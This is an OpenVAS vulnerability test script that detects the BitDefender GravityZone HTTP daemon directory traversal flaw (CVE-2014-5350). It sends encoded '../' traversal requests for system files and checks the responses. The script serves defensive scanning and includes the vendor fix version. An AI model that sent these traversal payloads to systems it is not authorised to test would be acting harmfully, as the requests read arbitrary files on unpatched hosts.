###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bitdefender_mult_vuln_07_14.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# BitDefender Products HTTP Daemon Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105063");
  script_cve_id("CVE-2014-5350");
  script_bugtraq_id(68669);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 11867 $");

  script_name("BitDefender Products HTTP Daemon Directory Traversal Vulnerability");


  script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140716-3_Bitdefender_GravityZone_Multiple_critical_vulnerabilities_v10.txt");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-07-17 12:10:53 +0200 (Thu, 17 Jul 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80, 7074);
  script_mandatory_keys("Arrakis/banner");

  script_tag(name:"impact", value:"Exploiting this issue allows an attacker to access potentially
sensitive information that could aid in further attacks.");
  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");
  script_tag(name:"insight", value:"Arbitrary files can be downloaded using a HTTP GET request:");
  script_tag(name:"solution", value:"Update to BitDefender GravityZone >= 5.1.11.432");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"BitDefender is prone to a directory-traversal vulnerability because
it fails to sufficiently sanitize user-supplied input data.");
  script_tag(name:"affected", value:"BitDefender GravityZone <= 5.1.5.386");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default: 7074);

banner = get_http_banner( port:port );
if( ! banner || "Server: Arrakis" >!< banner ) exit( 0 );

traversals = make_list( "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/", "/webservice/CORE/downloadFullKitEpc/a/1?id=../../../../../" );
files = traversal_files();

foreach traversal ( traversals )
{
  foreach file ( keys( files ) )
  {
    url = traversal + files[file];
    if( buf = http_vuln_check( port:port, url:url, pattern:file ) )
    {
      expert_info = 'Request:\n' + __ka_last_request + '\nResponse:\n' + buf;
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report, expert_info:expert_info );
      exit( 0 );
    }
  }
}

exit( 99 );


